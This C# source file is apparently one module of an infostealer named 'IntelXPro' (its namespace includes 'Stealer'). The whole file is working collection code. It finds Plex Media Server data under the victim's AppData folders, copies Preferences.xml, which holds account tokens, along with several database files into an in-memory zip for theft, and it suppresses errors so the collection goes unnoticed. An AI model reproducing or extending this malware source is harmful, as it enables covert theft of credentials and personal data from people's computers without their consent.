using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications
{
    internal class PlexDesktop : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string localAppDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Plex");
            string appDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Plex");

            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "PlexDesktop";

            bool foundData = false;

            if (Directory.Exists(localAppDataPath))
            {
                foundData |= CollectFromDirectory(localAppDataPath, "LocalAppData", zip, counterApplications);
            }

            if (Directory.Exists(appDataPath))
            {
                foundData |= CollectFromDirectory(appDataPath, "AppData", zip, counterApplications);
            }

            if (foundData && counterApplications.Files.Count > 0)
            {
                counter.Applications.Add(counterApplications);
            }
        }

        private bool CollectFromDirectory(string basePath, string location, InMemoryZip zip, Counter.CounterApplications counterApplications)
        {
            bool foundData = false;

            try
            {
                string plexMediaServerPath = Path.Combine(basePath, "Plex Media Server");
                if (Directory.Exists(plexMediaServerPath))
                {
                    string preferencesFile = Path.Combine(plexMediaServerPath, "Preferences.xml");
                    if (File.Exists(preferencesFile))
                    {
                        string zipPath = $"Applications\\PlexDesktop\\{location}\\Preferences.xml";
                        zip.AddFile(zipPath, File.ReadAllBytes(preferencesFile));
                        counterApplications.Files.Add(preferencesFile + " => " + zipPath);
                        foundData = true;
                    }

                    string pluginSupportPath = Path.Combine(plexMediaServerPath, "Plug-in Support");
                    if (Directory.Exists(pluginSupportPath))
                    {
                        string databasesPath = Path.Combine(pluginSupportPath, "Databases");
                        if (Directory.Exists(databasesPath))
                        {
                            string[] dbFiles = Directory.GetFiles(databasesPath, "*.db", SearchOption.TopDirectoryOnly);
                            
                            foreach (string file in dbFiles.Take(5))
                            {
                                string fileName = Path.GetFileName(file);
                                string zipPath = $"Applications\\PlexDesktop\\{location}\\Databases\\{fileName}";
                                zip.AddFile(zipPath, File.ReadAllBytes(file));
                                counterApplications.Files.Add(file + " => " + zipPath);
                                foundData = true;
                            }
                        }
                    }
                }
            }
            catch
            {
            }

            return foundData;
        }
    }
}
